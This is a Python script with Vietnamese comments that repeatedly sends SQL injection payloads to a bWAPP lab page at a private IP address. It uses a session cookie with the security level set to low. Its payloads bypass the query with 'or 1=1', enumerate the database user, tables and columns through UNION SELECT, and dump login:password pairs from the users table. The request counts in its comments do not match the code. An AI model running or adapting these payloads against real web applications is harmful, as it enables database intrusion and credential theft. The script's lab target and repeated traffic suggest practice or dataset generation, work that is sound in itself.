# chu y thay doi ip va PHPSESSID
import requests
import time

# URL của trang mà bạn muốn tấn công SQL injection
url = "http://192.168.10.10/sqli_1.php"

# Danh sách các payload SQL injection
payloads = [
    "lam' or 1=1 #",
    "lam' union select 1,user(),3,4,5,6,7 #",
    "lam' union select 1,user(), database(),4,5,6,7 #",
    "lam' union select 1, (select GROUP_CONCAT(table_name,'\n') from information_schema.tables where table_type='BASE TABLE'),3,4,5,6,7 #",
    "lam' UNION SELECT 1, (SELECT GROUP_CONCAT(login,':', password) FROM users),3,4,5,6,7 #",
    "lam 'order by 1#",
    "uyen' union select 1, (select GROUP_CONCAT(column_name,'\n') FROM information_schema.columns WHERE table_name ='users'),3,4,5,6,7 #"
]
#tìm PHPSE : vào inspect -> application -> làm 1 hành động gì đó -> nhìn thấy giá trị của PHPSESSIDSSID
# Headers nếu cần thiết (ví dụ Cookie để đăng nhập vào bWAPP)
headers = {
    'Cookie': 'security_level=0; PHPSESSID=ldnfropeb325j8cgdenhg4aer2'  # Thay PHPSESSID bằng giá trị thực tế
    # mỗi lần đăng nhập vào bwapp là nó lại thay đổi PHPSESSID nên mỗi lần đăng nhập thì phải sửa lại
    # security_level=0 : tấn công mức low
}

# Tổng số lần lặp lại mỗi payload, mỗi payload là 7 yêu cầu, tương đường 980 request
iterations = 290

# Tự động gửi từng payload lặp lại 140 lần
for i in range(iterations):
    for payload in payloads:
        # Tạo tham số truy vấn cho SQL injection, với title là payload và action là search
        params = {'title': payload, 'action': 'search'}
        
        # Gửi yêu cầu GET với tham số và headers
        response = requests.get(url, params=params, headers=headers)
        
        # Kiểm tra và hiển thị kết quả trả về
        if response.status_code == 200:
            print(f"Iteration: {i + 1} | Thanh cong")
        else:
            print(f"Iteration: {i + 1} | That bai")

        # Tạm dừng giữa các yêu cầu để tránh làm quá tải hệ thống
        time.sleep(1)  # Tạm dừng 2 giây giữa các yêu cầu (có thể điều chỉnh)
